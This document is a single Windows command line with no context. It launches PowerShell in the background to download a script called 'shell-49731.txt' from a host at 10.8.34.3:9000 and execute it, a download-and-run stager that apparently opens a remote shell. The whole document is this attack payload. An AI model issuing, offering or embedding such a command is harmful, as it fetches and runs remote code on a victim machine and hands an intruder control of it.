START /B powershell -c $code=(New-Object System.Net.Webclient).DownloadString('http://10.8.34.3:9000/shell-49731.txt');iex 'powershell -E $code'
